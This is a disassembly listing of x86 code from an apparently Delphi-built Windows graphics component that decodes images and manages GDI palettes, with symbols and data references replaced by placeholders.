xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push j_sub_44c770#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a48
call sub_44c7a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a474
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
sub_46a498
push ebx
push esi
call sub_44c3d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
call sub_44c070
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44c060
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44c3c0
sub_46a4cc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi rw-data
xor edx edx
mov eax edi
call sub_4115f4
mov eax edi
call sub_46b480
mov al [ esi ]
mov [ edi + 0x37 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x35 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x3a ] al
mov al [ esi + 0x3 ]
mov [ edi + 0x36 ] al
mov al [ esi + 0x4 ]
mov [ edi + 0x38 ] al
mov al [ esi + 0x5 ]
mov [ edi + 0x39 ] al
mov al [ esi + 0x6 ]
mov [ edi + 0x3b ] al
mov al [ esi + 0x7 ]
mov [ edi + 0x34 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_46a540
push ebx
push esi
call sub_44c3d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
mov eax [ esi + 0x24 ]
call sub_44c070
mov eax [ esi + 0x20 ]
call sub_413a10
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43ccd0
test bl bl
jle r-xdata
push eax
call DeleteObject
pop esi
pop ebx
retn
mov eax esi
call sub_44c3c0
sub_46a584
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebx + 0x20 ]
call sub_413a10
mov edi esi
mov eax [ edi + 0x20 ]
mov [ ebx + 0x20 ] eax
call sub_413a00
cmp [ edi + 0x24 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43cd0c
mov eax ebx
call sub_46b480
mov eax ebx
call sub_46b464
mov edx esi
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_46b464
mov edx [ edi + 0x24 ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_46a604
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43ce10
pop esi
pop ebx
retn
mov eax ebx
call sub_46af1c
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_46a63c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov ebx eax
call GetTickCount
mov edx eax
mov ecx edx
mov eax [ ebx + 0x20 ]
sub ecx eax
cmp ecx 0x1f4
jl r-xdata
mov [ ebx + 0x20 ] edx
test eax eax
je r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
push 0x0
lea eax [ esp + 0x4 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_43b7c8
mov edi esi
mov eax [ edi + 0x88 ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ edi + 0x6c ]
mov edx [ ebx + 0x24 ]
xor eax eax
call sub_43b7c8
mov eax [ esp + 0xc ]
cmp eax [ ebx + 0x24 ]
jge r-xdata
mov [ ebx + 0x1c ] eax
cmp [ esi + 0xc ] 0x0
je r-xdata
fild [ ebx + 0x4 ]
fild [ ebx + 0x8 ]
fdivp st1
fild [ ebx + 0xc ]
faddp st1
fmul [ r-xdata ]
fild [ ebx + 0x10 ]
fdivp st1
call sub_44bc34
cmp eax [ ebx + 0x1c ]
je r-xdata
mov eax [ edi + 0x70 ]
mov [ esp + 0xc ] eax
jmp r-xdata
push eax
mov eax [ esp + 0x10 ]
sub eax [ esp + 0x8 ]
cmp eax 0x4
setge al
push eax
lea eax [ esp + 0x8 ]
push eax
push 0x0
mov cl 0x1
mov esi [ ebx + 0x14 ]
mov edx esi
mov eax esi
mov bx 0xfffd
call sub_44c24c
mov edx [ esi + 0x88 ]
mov [ ebx + 0x24 ] edx
sub_46a754
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov edx 0x26c
call sub_44bd90
mov eax [ ebp - 0x4 ]
mov edi eax
mov esi rw-data
mov ecx 0x1d
[ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa8 ] eax
mov eax [ ebp - 0x4 ]
add eax 0xa8
mov ecx 0x1c2
mov edx 0x3d
call sub_4598ec
xor eax eax
push ebp
push j_sub_44c4bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax sub_46a63c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x88 ] ebx
mov eax [ ebp - 0x4 ]
add eax 0x74
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x8 ]
xor edx edx
call sub_43eaa4
mov eax [ ebx + 0x20 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
add eax 0xa8
call sub_45b094
mov eax [ ebp - 0x4 ]
add eax 0xa8
or edx 0xffffffff
call sub_459bf0
mov eax [ ebp - 0x4 ]
mov [ eax + 0xd4 ] 0x1
mov cl [ ebx + 0x3b ]
mov eax 0x1
shl eax cl
mov edx [ ebp - 0x4 ]
mov [ edx + 0xd8 ] eax
mov al [ ebx + 0x34 ]
neg al
sbb eax eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0xf4 ] eax
cmp [ ebx + 0x35 ] 0x0
je r-xdata
cmp [ ebx + 0x36 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xd0 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0xf8 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov [ eax + 0x104 ] 0xec
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd0 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xec ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x100 ]
neg eax
sbb eax eax
neg eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa0 ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xfc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa4 ] eax
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xec ] 0x1
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x100 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xfc ] 0x1
cmp [ ebx + 0x3a ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0xa8
call sub_459d3c
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x100 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x110 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xec ] 0x1
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x100 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xfc ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0xe4 ] 0xffffffff
sub_46a95c
push ebp
mov ebp esp
add esp 0xfffffd94
push ebx
mov ebx eax
cmp [ ebx + 0x3c ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x26c ]
mov eax ebx
call sub_46a754
xor eax eax
push ebp
push j_sub_44c770#8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x1bc ] eax
lea eax [ ebp - 0x1c4 ]
call sub_45b538
mov eax [ ebp - 0x158 ]
mov [ ebx + 0x28 ] eax
mov eax [ ebp - 0x154 ]
mov [ ebx + 0x2c ] eax
lea eax [ ebp - 0x1c4 ]
call sub_459d3c
neg eax
sbb eax eax
neg eax
mov [ ebx + 0x39 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x26c ]
call sub_46a730
retn
sub_46a9f0
push ebp
mov ebp esp
add esp 0xfffffd74
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x27c ]
xor ecx ecx
mov edx 0x26c
call sub_44bd90
mov esi rw-data
lea edi [ ebp - 0x27c ]
mov ecx 0x1d
[ edi ] [ esi ]
lea eax [ ebp - 0x27c ]
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x1d4 ]
mov ecx 0x165
mov edx 0x3d
call sub_4651c4
xor edx edx
push ebp
push j_sub_44c770#7
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push j_sub_44c5e8#2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_46a63c
mov [ ebp - 0x208 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1f4 ] eax
lea eax [ ebp - 0x208 ]
mov [ ebp - 0x1cc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ eax + 0x8 ] ebx
mov eax ebx
xor edx edx
call sub_43eaa4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov edx [ eax + 0x8 ]
lea eax [ ebp - 0x1d4 ]
call sub_46463c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x24 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46b480
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_44c848
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov [ ebp - 0x1bc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov [ ebp - 0x1b8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
mov [ edx + 0xc ] eax
mov [ ebp - 0x1b4 ] 0x3
mov [ ebp - 0x1b0 ] 0x2
mov dl 0x1
mov eax [ r-xdata ]
call sub_414588
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_46ad18
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x24 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x6
mov eax [ ebp - 0x10 ]
call sub_415f2c
lea eax [ ebp - 0x1d4 ]
call sub_46483c
mov eax [ ebp - 0x4 ]
xor edx edx
mov dl [ eax + 0x37 ]
lea eax [ ebp - 0x1d4 ]
or ecx 0xffffffff
call sub_464778
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x35 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ eax + 0x14 ] 0x1
lea eax [ ebp - 0x1d4 ]
mov edx 0x1
call sub_4649a0
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_414e7c
mov [ ebp - 0xc ] eax
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_414e7c
mov esi eax
sub esi [ ebp - 0xc ]
test esi esi
jle r-xdata
lea eax [ ebp - 0x1d4 ]
call sub_464e08
mov [ ebp - 0x8 ] 0x1
test esi 0x3
jne r-xdata
mov eax [ ebp - 0xff ]
cmp eax [ ebp - 0x1b8 ]
jb r-xdata
mov eax [ ebp - 0x1b8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x1d4 ]
mov ecx [ ebp - 0x8 ]
call sub_465058
mov edx esi
imul edx eax
add [ ebp - 0xc ] edx
lea eax [ ebp - 0x1d4 ]
call sub_4652d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ad02
call sub_447768
test eax eax
jne r-xdata
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x28c ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_43b7c8
lea eax [ ebp - 0x28c ]
push eax
push 0x0
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov bx 0xfffd
call sub_44c24c
xor edx edx
push ebp
push sub_46acfb
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1d4 ]
or edx 0xffffffff
call sub_464fec
jmp r-xdata
xor esi esi
mov esi 0x64
jmp r-xdata
mov eax esi
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x28c ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_43b7c8
lea eax [ ebp - 0x28c ]
push eax
push 0x0
mov cl 0x2
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov bx 0xfffd
call sub_44c24c
retn
sub_46ad1f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x27c ]
call sub_46a730
retn
sub_46ad2e
add [ eax ] eax
add [ eax ] al
rcl [ ebp + 0x44 ] 0x0
cmp ch [ ebp + 0x458b0046 ]
cld
call sub_46b480
call sub_44c818
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x27c ]
call sub_46a730
retn
sub_46ad70
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_46af1c
mov ecx eax
mov edx edi
mov eax esi
call sub_40f964
pop edi
pop esi
pop ebx
retn
sub_46ad90
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
mov eax esi
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x20 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp eax [ esi + 0x20 ]
sete bl
mov edx [ esi + 0x20 ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_411718
mov ebx eax
jmp r-xdata
sub_46adec
push esi
push edi
add esp 0xfffffbfc
mov edi eax
mov [ esp ] 0x300
mov dx [ edi + 0x80 ]
mov [ esp + 0x2 ] dx
cmp [ edi + 0x28 ] 0x1
jne r-xdata
movzx esi dx
dec esi
test esi esi
jl r-xdata
movzx esi dx
dec esi
test esi esi
jl r-xdata
mov eax esp
push eax
call CreatePalette
add esp 0x404
pop edi
pop esi
retn
inc esi
xor ecx ecx
lea edx [ esp + 0x4 ]
inc esi
xor ecx ecx
lea edx [ esp + 0x4 ]
mov eax [ edi + 0x84 ]
mov eax [ eax + 0x8 ]
mov al [ eax + ecx ]
mov [ edx ] al
mov eax [ edi + 0x84 ]
mov eax [ eax + 0x4 ]
mov al [ eax + ecx ]
mov [ edx + 0x1 ] al
mov eax [ edi + 0x84 ]
mov eax [ eax ]
mov al [ eax + ecx ]
mov [ edx + 0x2 ] al
mov [ edx + 0x3 ] 0x0
inc ecx
add edx 0x4
dec esi
jne r-xdata
mov eax [ edi + 0x84 ]
mov eax [ eax ]
mov al [ eax + ecx ]
mov [ edx ] al
mov [ edx + 0x1 ] al
mov [ edx + 0x2 ] al
mov [ edx + 0x3 ] 0x0
inc ecx
add edx 0x4
dec esi
jne r-xdata
jmp r-xdata
sub_46ae94
push ebx
push esi
push edi
push ebp
add esp 0xfffffbfc
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push edx
call GetPaletteEntries
mov esi eax
test esi esi
je r-xdata
add esp 0x404
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x3
mov edi [ ebx + 0x4 ]
mov eax ebx
mov ecx esi
mov edx 0x1
call [ edi + 0x8 ]
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x80 ] esi
mov edi esi
dec edi
test edi edi
jl r-xdata
inc edi
xor edx edx
lea eax [ esp + 0x4 ]
mov esi [ ebx + 0x84 ]
mov ecx [ esi + 0x8 ]
lea ebp [ ecx + edx ]
mov cl [ eax ]
mov [ ebp ] cl
mov ecx [ esi + 0x4 ]
lea ebp [ ecx + edx ]
mov cl [ eax + 0x1 ]
mov [ ebp ] cl
mov ecx [ esi ]
lea esi [ ecx + edx ]
mov cl [ eax + 0x2 ]
mov [ esi ] cl
inc edx
add eax 0x4
dec edi
jne r-xdata
sub_46af1c
push ebp
mov ebp esp
add esp 0xfffffd74
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xd ] 0x1
lea edx [ ebp - 0x27c ]
mov eax [ ebp - 0x4 ]
call sub_46a754
xor edx edx
push ebp
push j_sub_44c770#5
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push j_sub_44c5e8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
xor edx edx
call sub_415a4c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x36 ] 0x1
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_414588
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov dl 0x3
call sub_415f2c
jmp r-xdata
cmp [ ebp - 0x1ac ] 0x1
jne r-xdata
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x28c ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_43b7c8
lea eax [ ebp - 0x28c ]
push eax
push 0x0
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov bx 0xfffd
call sub_44c24c
xor edx edx
push ebp
push j_sub_44c770#6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov dl 0x6
call sub_415f2c
lea eax [ ebp - 0x1d4 ]
call sub_45b100
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x24 ]
xor edx edx
mov eax ebx
call sub_415a4c
mov edx [ ebp - 0x168 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebp - 0x164 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
xor edx edx
mov eax ebx
call sub_414e7c
mov [ ebp - 0xc ] eax
mov edx 0x1
mov eax ebx
call sub_414e7c
sub eax [ ebp - 0xc ]
mov ebx eax
test ebx ebx
jle r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x36 ] 0x1
jne r-xdata
mov esi 0x1
test bl 0x3
jne r-xdata
push eax
call DeleteObject
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
mov edx eax
lea eax [ ebp - 0x1d4 ]
call sub_46ae94
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4142e4
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov [ ebp - 0xd ] 0x0
jmp r-xdata
cmp [ ebp - 0x198 ] 0x0
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x158 ]
jmp r-xdata
cmp [ ebp - 0x150 ] 0x0
je r-xdata
cmp [ ebp - 0x1dc ] 0x0
je r-xdata
lea eax [ ebp - 0x1d4 ]
call sub_459c5c
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x198 ] 0x0
je r-xdata
mov eax [ ebp - 0x14c ]
cmp eax [ ebp - 0x164 ]
jb r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x1d4 ]
mov edx [ ebp - 0x148 ]
call sub_45b3c0
mov eax [ ebp - 0x1cc ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x1e0 ]
mov [ ebp - 0x190 ] eax
mov eax [ ebp - 0x1d8 ]
mov [ ebp - 0x180 ] eax
cmp [ ebp - 0x1dc ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x1d4 ]
mov ecx esi
call sub_45b284
mov edx ebx
imul edx eax
add [ ebp - 0xc ] edx
cmp [ ebp - 0x198 ] 0x0
je r-xdata
lea eax [ ebp - 0x1d4 ]
call sub_46adec
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1a ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
xor edx edx
call sub_414e7c
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
xor edx edx
call sub_414e7c
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0x150 ] 0x0
je r-xdata
lea eax [ ebp - 0x1d4 ]
mov edx [ ebp - 0x148 ]
call sub_45b3c0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
xor edx edx
call sub_414e7c
mov [ ebp - 0xc ] eax
mov [ ebp - 0x17c ] 0xffffffff
xor eax eax
mov [ ebp - 0x150 ] eax
lea eax [ ebp - 0x1d4 ]
call sub_459d70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b2d8
call sub_447768
test eax eax
jne r-xdata
lea eax [ ebp - 0x1d4 ]
call sub_45b420
mov eax [ ebp - 0x14c ]
cmp eax [ ebp - 0x164 ]
jb r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_414dc4
cmp al 0x3
jne r-xdata
xor ebx ebx
mov ebx 0x64
jmp r-xdata
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x1d4 ]
mov ecx esi
call sub_45b284
mov edx ebx
imul edx eax
add [ ebp - 0xc ] edx
lea eax [ ebp - 0x1d4 ]
call sub_45b420
cmp [ ebp - 0xd ] 0x0
je r-xdata
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
push ebx
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
push eax
push 0x0
lea eax [ ebp - 0x28c ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_43b7c8
lea eax [ ebp - 0x28c ]
push eax
push 0x0
mov cl 0x2
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov bx 0xfffd
call sub_44c24c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a ] 0x0
je r-xdata
lea eax [ ebp - 0x1d4 ]
call sub_46adec
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1a ] 0x1
sub_46b2d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x27c ]
call sub_46a730
retn
sub_46b2e7
add [ eax ] eax
add [ eax ] al
rcl [ ebp + 0x44 ] 0x0
mov dl 0x46
add al ch
and [ 0xffffffffc033fffe ] dl
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x27c ]
call sub_46a730
retn
sub_46b324
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov esi [ ebx + 0x24 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
sub_46b350
push ebx
push esi
push edi
push ebp
mov ebx eax
xor esi esi
mov eax [ ebx + 0x24 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
jmp r-xdata
cmp [ ebx + 0x36 ] 0x0
jne r-xdata
mov esi eax
jmp r-xdata
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x0
call GetDC
mov edi eax
push 0xc
push edi
call GetDeviceCaps
mov ebp eax
push 0xe
push edi
call GetDeviceCaps
imul ebp eax
cmp ebp 0x8
jg r-xdata
push edi
push 0x0
call ReleaseDC
push edi
call CreateHalftonePalette
mov esi eax
mov [ ebx + 0x30 ] esi
sub_46b3b8
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx + 0x3b ] 0x0
jne r-xdata
mov edx [ eax ]
call [ edx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_46a95c
mov eax [ ebx + 0x2c ]
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0xc ]
jmp r-xdata
pop ebx
retn
sub_46b3e4
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx + 0x3b ] 0x0
jne r-xdata
mov edx [ eax ]
call [ edx + 0x2c ]
pop ebx
retn
mov eax ebx
call sub_46a95c
mov eax [ ebx + 0x28 ]
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x10 ]
jmp r-xdata
pop ebx
retn
sub_46b420
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x24 ]
mov ebx [ eax ]
call [ ebx + 0x58 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_46b440
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_43eac4
push eax
mov eax ebx
call sub_43ea80
pop edx
sub edx eax
mov ecx ebx
mov eax esi
call sub_46b4d4
pop esi
pop ebx
retn
sub_46b480
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x20 ]
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov esi eax
mov [ ebx + 0x20 ] esi
mov eax esi
call sub_413a00
pop esi
pop ebx
retn
call sub_413a10
sub_46b4ac
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
mov ecx esi
mov edx [ esp ]
mov eax ebx
call sub_46b4d4
pop edx
pop edi
pop esi
pop ebx
retn
sub_46b4d4
push ebp
mov ebp esp
add esp 0xfffffdc0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46b480
mov eax [ ebp - 0x4 ]
